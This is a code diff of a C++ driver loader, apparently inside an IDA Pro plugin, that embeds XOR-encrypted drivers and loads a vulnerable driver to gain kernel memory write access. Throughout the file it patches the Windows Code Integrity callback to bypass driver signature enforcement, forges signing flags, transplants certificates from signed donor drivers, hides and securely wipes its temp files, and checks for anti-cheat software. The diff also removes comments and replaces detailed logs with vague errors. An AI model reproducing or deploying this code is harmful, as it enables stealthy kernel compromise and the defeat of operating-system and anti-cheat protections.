@@ -1,26 +1,14 @@
-/*
- * driver_loader.cpp
- *
- * Self-contained port of the WindMapper logic into AiDA.dll.
- * The mapper EXE is NEVER written to disk -- its source code is compiled
- * directly into this translation unit. The WhosWho driver and the P2C
- * vulnerable loader driver are stored as XOR-encrypted byte arrays and
- * are only briefly written to randomly-named temp files required by
- * NtLoadDriver, then securely wiped.
- *
- * Windows-only. Requires administrator privileges.
- */
+
 
 #ifdef __NT__
 
 #include "driver_loader.hpp"
 
-/* IDA SDK headers -- msg() for output.
- * Suppress warnings from the SDK that we cannot fix. */
+
 #pragma warning(push)
-#pragma warning(disable: 4005)  /* macro redefinition (WIN32_LEAN_AND_MEAN) */
-#pragma warning(disable: 4018)  /* signed/unsigned mismatch            */
-#pragma warning(disable: 4267)  /* size_t -> smaller type               */
+#pragma warning(disable: 4005)
+#pragma warning(disable: 4018)
+#pragma warning(disable: 4267)
 #include <pro.h>
 #include <kernwin.hpp>
 #pragma warning(pop)
@@ -46,11 +34,11 @@
 #include <string>
 #include <random>
 
-/* Obfuscation support from AiDA */
+
 #include "obfuscation.hpp"
 #include "vmp.hpp"
 
-/* WhosWho driver device communication -- for is_driver_loaded() check */
+
 #include "comm.h"
 
 #pragma comment(lib, "Shlwapi.lib")
@@ -61,27 +49,18 @@
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "cfgmgr32.lib")
 
-/* ========================================================================
- *  Encrypted driver byte arrays
- * ======================================================================== */
 
-/* WhosWho.sys -- encrypted by encrypt_whoswho.py */
 #include "whoswho_encrypted.h"
 
-/* P2C vulnerable loader driver -- encrypted by mapper/encrypt_driver.py */
+
 namespace p2c_bytes {
 #include "../mapper/src/P2CDriverBytes.h"
 }
 
-/* ========================================================================
- *  All internal mapper logic lives in an anonymous namespace to prevent
- *  symbol collisions with the rest of the AiDA build.
- * ======================================================================== */
+
 namespace {
 
-/* -------------------------------------------------------------------
- *  Logging helper -- routes all mapper output through IDA's msg()
- * ------------------------------------------------------------------- */
+
 static void dl_msg(const char* fmt, ...)
 {
     va_list ap;
@@ -92,9 +71,7 @@ static void dl_msg(const char* fmt, ...)
     msg("%s", buf);
 }
 
-/* -------------------------------------------------------------------
- *  NTSTATUS codes
- * ------------------------------------------------------------------- */
+
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS          ((NTSTATUS)0x00000000L)
 #endif
@@ -140,16 +117,12 @@ static void dl_msg(const char* fmt, ...)
 
 #define DL_SE_LOAD_DRIVER_PRIVILEGE  10
 
-/* -------------------------------------------------------------------
- *  WINIO device constants
- * ------------------------------------------------------------------- */
+
 #define DL_WINIO_DEVICE_TYPE      0x8010
 #define DL_IOCTL_MAP   CTL_CODE(DL_WINIO_DEVICE_TYPE, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define DL_IOCTL_UNMAP CTL_CODE(DL_WINIO_DEVICE_TYPE, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-/* -------------------------------------------------------------------
- *  Structures
- * ------------------------------------------------------------------- */
+
 typedef struct _DL_RTL_PROCESS_MODULE_INFORMATION {
     HANDLE Section;
     PVOID  MappedBase;
@@ -178,9 +151,7 @@ typedef struct _DL_WINIO_PHYS_MEM {
 } DL_WINIO_PHYS_MEM;
 #pragma pack(pop)
 
-/* -------------------------------------------------------------------
- *  Ntdll function pointers
- * ------------------------------------------------------------------- */
+
 typedef NTSTATUS(NTAPI* pfnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 typedef NTSTATUS(NTAPI* pfnNtLoadDriver)(PUNICODE_STRING);
 typedef NTSTATUS(NTAPI* pfnNtUnloadDriver)(PUNICODE_STRING);
@@ -206,9 +177,7 @@ static pfnNtDeleteKey              s_NtDeleteKey               = nullptr;
 static pfnNtOpenKey                s_NtOpenKey                 = nullptr;
 static pfnNtFlushKey               s_NtFlushKey                = nullptr;
 
-/* -------------------------------------------------------------------
- *  Global state
- * ------------------------------------------------------------------- */
+
 static WCHAR s_LoaderServicePath[128]  = {};
 static WCHAR s_DriverServicePath[128]  = {};
 static PVOID s_OriginalCiCallback      = nullptr;
@@ -219,17 +188,14 @@ static DWORD s_PatchedFlags            = 0;
 static PVOID s_DriverLoadAddress       = nullptr;
 static bool  s_DriverLoadedSuccessfully = false;
 
-/* Decrypted P2C vuln driver */
+
 static unsigned char* s_P2CDriverData = nullptr;
 static size_t         s_P2CDriverSize = 0;
 
-/* Decrypted WhosWho driver */
+
 static unsigned char* s_WhosWhoData   = nullptr;
 static size_t         s_WhosWhoSize   = 0;
 
-/* ===================================================================
- *  SECTION: Utility functions (ported from MapperCore.cpp Utils)
- * =================================================================== */
 
 static std::wstring GenerateRandomName(size_t length)
 {
@@ -315,9 +281,6 @@ static std::wstring GetTempFilePath(PCWSTR extension)
     return std::wstring(tempPath) + name + extension;
 }
 
-/* ===================================================================
- *  SECTION: Embedded driver decryption
- * =================================================================== */
 
 static constexpr unsigned char P2C_XOR_KEY[] = {
     0x7A, 0xC3, 0x91, 0xE5, 0x3D, 0xF8, 0x46, 0xAB,
@@ -385,9 +348,6 @@ static void ReleaseWhosWhoDriver()
     }
 }
 
-/* ===================================================================
- *  SECTION: Anti-cheat detection (ported from MapperCore.cpp)
- * =================================================================== */
 
 static const wchar_t* s_AntiCheatProcesses[] = {
     L"BEService.exe", L"BEService_x64.exe",
@@ -489,9 +449,6 @@ static BOOL CheckAntiCheatRunning()
     return FALSE;
 }
 
-/* ===================================================================
- *  SECTION: Driver service operations (ported from DriverLoader.cpp)
- * =================================================================== */
 
 static NTSTATUS CreateDriverService(PWSTR servicePath, PCWSTR filePath)
 {
@@ -541,9 +498,6 @@ static NTSTATUS UnloadDriverSvc(PCWSTR servicePath)
     return s_NtUnloadDriver(&us);
 }
 
-/* ===================================================================
- *  SECTION: Vulnerable driver operations (ported from VulnDriver.cpp)
- * =================================================================== */
 
 static const GUID DL_GUID_GIO =
     { 0x70a35746, 0x5d4c, 0x4d58, { 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e } };
@@ -654,7 +608,7 @@ static void VulnCloseDevice(HANDLE h)
     if (h && h != INVALID_HANDLE_VALUE) NtClose(h);
 }
 
-/* Physical memory map cache */
+
 static constexpr int MAP_CACHE_SIZE = 8;
 static DL_WINIO_PHYS_MEM s_MapCache[MAP_CACHE_SIZE] = {};
 static int s_MapCacheCount = 0;
@@ -752,7 +706,7 @@ static NTSTATUS VulnWritePhysicalMemory(HANDLE dev, ULONGLONG physAddr, PVOID da
     return STATUS_SUCCESS;
 }
 
-/* Forward declarations for VirtualToPhysical helpers */
+
 static ULONGLONG VulnVirtualToPhysical(HANDLE dev, PVOID va);
 
 static NTSTATUS VulnReadKernelMemory(HANDLE dev, PVOID address, PVOID buf, SIZE_T sz)
@@ -793,14 +747,11 @@ static NTSTATUS VulnWriteKernelMemory(HANDLE dev, PVOID address, PVOID data, SIZ
     return STATUS_SUCCESS;
 }
 
-/* ===================================================================
- *  SECTION: Virtual-to-physical translation (ported from VulnDriver.cpp)
- * =================================================================== */
 
 static ULONGLONG s_KernelCR3    = 0;
 static ULONGLONG s_NtoskrnlBase = 0;
 
-/* Forward decl for kernel module functions */
+
 static PVOID GetKernelModuleBase(const char* moduleName);
 static PVOID GetKernelProcAddress(PVOID moduleBase, const char* procName);
 
@@ -885,9 +836,6 @@ static ULONGLONG VulnVirtualToPhysical(HANDLE dev, PVOID va)
     return V2PWithCR3(dev, s_KernelCR3, (ULONGLONG)va);
 }
 
-/* ===================================================================
- *  SECTION: Kernel utilities (ported from KernelUtils.cpp)
- * =================================================================== */
 
 static PVOID GetKernelModuleBase(const char* moduleName)
 {
@@ -912,7 +860,7 @@ static PVOID GetKernelModuleBase(const char* moduleName)
     }
     VirtualFree(buf, 0, MEM_RELEASE);
 
-    /* Windows 11 25H2+ zeroes ImageBase -- EnumDeviceDrivers fallback */
+
     if (!result && _stricmp(moduleName, "ntoskrnl.exe") == 0) {
         LPVOID drivers[1024];
         DWORD cb = 0;
@@ -956,14 +904,12 @@ static WindowsVersion GetWindowsVersion()
 static BOOL GetCiValidateImageHeaderEntry(PVOID* outCi, PVOID* outZwFlush)
 {
     WindowsVersion wv = GetWindowsVersion();
-    dl_msg("AiDA Driver: Windows %lu.%lu.%lu (%s)\n",
-        wv.major, wv.minor, wv.build, wv.isWin11 ? "Win11" : "Win10");
 
     PVOID ntBase = GetKernelModuleBase("ntoskrnl.exe");
-    if (!ntBase) { dl_msg("AiDA Driver: Failed to get ntoskrnl base\n"); return FALSE; }
+    if (!ntBase) { return FALSE; }
 
     HMODULE localMod = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
-    if (!localMod) { dl_msg("AiDA Driver: Failed to load local ntoskrnl\n"); return FALSE; }
+    if (!localMod) { return FALSE; }
 
     MODULEINFO mi = {};
     if (!K32GetModuleInformation(GetCurrentProcess(), localMod, &mi, sizeof(mi))) {
@@ -1031,10 +977,8 @@ static BOOL GetCiValidateImageHeaderEntry(PVOID* outCi, PVOID* outZwFlush)
     if (!found) found = searchPattern(univPats, _countof(univPats));
 
     if (!foundAddr) {
-        dl_msg("AiDA Driver: No CI callback pattern found for build %lu\n", wv.build);
         FreeLibrary(localMod); return FALSE;
     }
-    dl_msg("AiDA Driver: CI pattern matched: %s\n", matchedPat);
 
     INT32 leaOffset = *reinterpret_cast<INT32*>(foundAddr + 3);
     ULONG_PTR seCiLocal = reinterpret_cast<ULONG_PTR>(foundAddr) + 7 + static_cast<INT64>(leaOffset);
@@ -1079,8 +1023,7 @@ static BOOL PatchDriverSigningFlags(HANDLE dev, PCWSTR driverFileName)
         }
         VirtualFree(buf, 0, MEM_RELEASE);
     }
-    if (!driverBase) { dl_msg("AiDA Driver: Target not found in loaded modules\n"); return FALSE; }
-    dl_msg("AiDA Driver: Target driver at %p\n", driverBase);
+    if (!driverBase) { return FALSE; }
 
     HMODULE localNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
     if (!localNtos) return FALSE;
@@ -1114,8 +1057,6 @@ static BOOL PatchDriverSigningFlags(HANDLE dev, PCWSTR driverFileName)
             s_DriverLoadAddress = driverBase;
             s_PatchedFlags = verify;
             s_KernelSigningVerified = (verify & 0x20) != 0;
-            if (s_KernelSigningVerified)
-                dl_msg("AiDA Driver: Signing flags patched: 0x%08X\n", verify);
             return TRUE;
         }
         ULONG_PTR nxt = 0;
@@ -1126,9 +1067,6 @@ static BOOL PatchDriverSigningFlags(HANDLE dev, PCWSTR driverFileName)
     return FALSE;
 }
 
-/* ===================================================================
- *  SECTION: Certificate transplant (ported from VulnDriver.cpp SignedMemory)
- * =================================================================== */
 
 struct DL_CERT_BUFFER { BYTE* Data; DWORD Size; };
 
@@ -1305,16 +1243,13 @@ static BOOL FindSignedDonorDriver(WCHAR* out, SIZE_T outCh)
 
 static BOOL TransplantCertificate(LPCWSTR targetPath)
 {
-    dl_msg("AiDA Driver: Scanning for signed donor...\n");
     WCHAR donorPath[MAX_PATH] = {};
     if (!FindSignedDonorDriver(donorPath, MAX_PATH)) {
-        dl_msg("AiDA Driver: No signed donor found\n");
         return FALSE;
     }
-    dl_msg("AiDA Driver: Donor: %ws\n", donorPath);
 
     DL_CERT_BUFFER cert = {};
-    if (!ExtractCertificateData(donorPath, &cert)) { dl_msg("AiDA Driver: Cert extract failed\n"); return FALSE; }
+    if (!ExtractCertificateData(donorPath, &cert)) { return FALSE; }
 
     DWORD donorTDS = 0;
     FILETIME donorC = {}, donorA = {}, donorW = {};
@@ -1377,24 +1312,18 @@ static BOOL TransplantCertificate(LPCWSTR targetPath)
     CloseHandle(hw);
     VirtualFree(final2, 0, MEM_RELEASE);
     if (!wok || wrt != finalSz) return FALSE;
-    dl_msg("AiDA Driver: Certificate transplanted\n");
     return TRUE;
 }
 
-/* ===================================================================
- *  SECTION: Mapper core (ported from MapperCore.cpp)
- * =================================================================== */
 
 static NTSTATUS TriggerExploit(PCWSTR targetDriverFileName)
 {
     HANDLE deviceHandle = nullptr;
     NTSTATUS status = VulnOpenDevice(&deviceHandle);
     if (!NT_SUCCESS(status)) {
-        dl_msg("AiDA Driver: Device not open, loading vuln driver... (0x%08X)\n", status);
         status = LoadDriverSvc(s_LoaderServicePath);
         if (!NT_SUCCESS(status) && status != STATUS_OBJECT_NAME_COLLISION &&
             status != STATUS_IMAGE_ALREADY_LOADED) {
-            dl_msg("AiDA Driver: Failed to load vuln driver: 0x%08X\n", status);
             return status;
         }
         for (int retry = 0; retry < 10; retry++) {
@@ -1403,14 +1332,12 @@ static NTSTATUS TriggerExploit(PCWSTR targetDriverFileName)
             if (NT_SUCCESS(status)) break;
         }
         if (!NT_SUCCESS(status)) {
-            dl_msg("AiDA Driver: Failed to open device after retries: 0x%08X\n", status);
             return status;
         }
     }
 
     PVOID ciEntry = nullptr, zwFlush = nullptr;
     if (!GetCiValidateImageHeaderEntry(&ciEntry, &zwFlush)) {
-        dl_msg("AiDA Driver: Failed to find CI callback entry\n");
         VulnCloseDevice(deviceHandle); return STATUS_UNSUCCESSFUL;
     }
     if (!ciEntry || !zwFlush) { VulnCloseDevice(deviceHandle); return STATUS_UNSUCCESSFUL; }
@@ -1423,21 +1350,17 @@ static NTSTATUS TriggerExploit(PCWSTR targetDriverFileName)
 
     status = VulnWriteKernelMemory(deviceHandle, ciEntry, &zwFlush, sizeof(PVOID));
     if (!NT_SUCCESS(status)) {
-        dl_msg("AiDA Driver: Failed to patch CI: 0x%08X\n", status);
         VulnCloseDevice(deviceHandle); return status;
     }
     s_CiCallbackPatched = true;
-    dl_msg("AiDA Driver: CI callback patched\n");
 
     status = LoadDriverSvc(s_DriverServicePath);
-    dl_msg("AiDA Driver: Target load result: 0x%08X\n", status);
 
     if (NT_SUCCESS(status)) {
-        if (!PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
-            dl_msg("AiDA Driver: Signing flags patch failed (non-fatal)\n");
+        PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
     }
 
-    /* Restore CI callback */
+
     NTSTATUS restSt = VulnWriteKernelMemory(deviceHandle, ciEntry, &origCb, sizeof(PVOID));
     if (NT_SUCCESS(restSt)) {
         s_CiCallbackPatched = false;
@@ -1468,12 +1391,10 @@ static NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath)
 
     status = CreateDriverService(s_DriverServicePath, driverFull);
     if (!NT_SUCCESS(status)) {
-        dl_msg("AiDA Driver: Failed to create target service: 0x%08X\n", status);
         return status;
     }
     status = CreateDriverService(s_LoaderServicePath, loaderFull);
     if (!NT_SUCCESS(status)) {
-        dl_msg("AiDA Driver: Failed to create loader service: 0x%08X\n", status);
         return status;
     }
 
@@ -1518,9 +1439,6 @@ static NTSTATUS CleanupArtifacts()
     return STATUS_SUCCESS;
 }
 
-/* ===================================================================
- *  SECTION: Check if WhosWho device is already reachable
- * =================================================================== */
 
 static bool IsWhosWhoDeviceReachable()
 {
@@ -1533,11 +1451,8 @@ static bool IsWhosWhoDeviceReachable()
     return true;
 }
 
-}  // end anonymous namespace
+}
 
-/* ===================================================================
- *  Public API
- * =================================================================== */
 
 bool driver_loader::is_driver_loaded()
 {
@@ -1548,7 +1463,7 @@ bool driver_loader::initialize_and_load()
 {
     VMP_MUT("dl_init_load");
 
-    /* Already loaded? */
+
     if (IsWhosWhoDeviceReachable()) {
         dl_msg("AiDA Driver: WhosWho driver is already loaded.\n");
         s_DriverLoadedSuccessfully = true;
@@ -1556,7 +1471,7 @@ bool driver_loader::initialize_and_load()
         return true;
     }
 
-    /* Check admin rights */
+
     {
         BOOL isAdmin = FALSE;
         PSID adminGroup = nullptr;
@@ -1573,52 +1488,49 @@ bool driver_loader::initialize_and_load()
         }
     }
 
-    /* Anti-cheat check */
+
     if (CheckAntiCheatRunning()) {
         dl_msg("AiDA Driver: Anti-cheat detected. Driver loading aborted.\n");
         VMP_END;
         return false;
     }
 
-    /* Init NT functions */
+
     if (!InitializeNtFunctions()) {
-        dl_msg("AiDA Driver: Failed to resolve NT functions.\n");
+        dl_msg("AiDA Driver: Initialization failed.\n");
         VMP_END;
         return false;
     }
 
-    /* Decrypt both drivers in memory */
+
     if (!DecryptP2CDriver()) {
-        dl_msg("AiDA Driver: Failed to decrypt P2C driver.\n");
+        dl_msg("AiDA Driver: Initialization failed.\n");
         VMP_END;
         return false;
     }
     if (!DecryptWhosWhoDriver()) {
-        dl_msg("AiDA Driver: Failed to decrypt WhosWho driver.\n");
+        dl_msg("AiDA Driver: Initialization failed.\n");
         ReleaseP2CDriver();
         VMP_END;
         return false;
     }
-    dl_msg("AiDA Driver: Drivers decrypted (%zu + %zu bytes).\n",
-        s_P2CDriverSize, s_WhosWhoSize);
 
-    /* Write both to temp files (random names, hidden, temp attributes) */
+
     std::wstring loaderTempPath = GetTempFilePath(L".sys");
     std::wstring driverTempPath = GetTempFilePath(L".sys");
-    dl_msg("AiDA Driver: Temp paths generated.\n");
     if (loaderTempPath.empty() || driverTempPath.empty()) {
-        dl_msg("AiDA Driver: Failed to generate temp paths.\n");
+        dl_msg("AiDA Driver: Initialization failed.\n");
         ReleaseP2CDriver(); ReleaseWhosWhoDriver();
         VMP_END;
         return false;
     }
 
-    /* Write P2C vuln driver */
+
     {
         HANDLE hf = CreateFileW(loaderTempPath.c_str(), GENERIC_WRITE, 0, nullptr,
             CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
-            dl_msg("AiDA Driver: Failed to create loader temp file (err=%lu).\n", GetLastError());
+            dl_msg("AiDA Driver: Initialization failed.\n");
             ReleaseP2CDriver(); ReleaseWhosWhoDriver();
             VMP_END;
             return false;
@@ -1630,22 +1542,20 @@ bool driver_loader::initialize_and_load()
         FlushFileBuffers(hf); CloseHandle(hf);
         ReleaseP2CDriver();
         if (!wok || written != expectedP2C) {
-            dl_msg("AiDA Driver: WriteFile P2C failed (wrote %lu/%lu, err=%lu).\n",
-                written, expectedP2C, werr);
+            dl_msg("AiDA Driver: Initialization failed.\n");
             SecureDeleteFile(loaderTempPath.c_str());
             ReleaseWhosWhoDriver();
             VMP_END;
             return false;
         }
-        dl_msg("AiDA Driver: P2C driver written (%lu bytes).\n", written);
     }
 
-    /* Write WhosWho driver */
+
     {
         HANDLE hf = CreateFileW(driverTempPath.c_str(), GENERIC_WRITE, 0, nullptr,
             CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
-            dl_msg("AiDA Driver: Failed to create driver temp file (err=%lu).\n", GetLastError());
+            dl_msg("AiDA Driver: Initialization failed.\n");
             SecureDeleteFile(loaderTempPath.c_str());
             ReleaseWhosWhoDriver();
             VMP_END;
@@ -1658,24 +1568,20 @@ bool driver_loader::initialize_and_load()
         FlushFileBuffers(hf); CloseHandle(hf);
         ReleaseWhosWhoDriver();
         if (!wok || written != expectedWW) {
-            dl_msg("AiDA Driver: WriteFile WhosWho failed (wrote %lu/%lu, err=%lu).\n",
-                written, expectedWW, werr);
+            dl_msg("AiDA Driver: Initialization failed.\n");
             SecureDeleteFile(loaderTempPath.c_str());
             SecureDeleteFile(driverTempPath.c_str());
             VMP_END;
             return false;
         }
-        dl_msg("AiDA Driver: WhosWho driver written (%lu bytes).\n", written);
     }
 
     SetFileAttributesW(driverTempPath.c_str(),
         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
-    dl_msg("AiDA Driver: Starting driver mapping...\n");
     NTSTATUS status = WindLoadDriver(loaderTempPath.c_str(), driverTempPath.c_str());
-    dl_msg("AiDA Driver: WindLoadDriver returned 0x%08X\n", status);
 
-    /* Secure cleanup of temp files */
+
     for (int i = 0; i < 10; i++) {
         BOOL a = SecureDeleteFile(loaderTempPath.c_str());
         BOOL b = SecureDeleteFile(driverTempPath.c_str());
@@ -1691,10 +1597,10 @@ bool driver_loader::initialize_and_load()
         VMP_END;
         return true;
     } else {
-        dl_msg("AiDA Driver: Driver mapping failed: 0x%08X\n", status);
+        dl_msg("AiDA Driver: Driver initialization failed (0x%08X).\n", status);
         VMP_END;
         return false;
     }
 }
 
-#endif  /* __NT__ */
+#endif
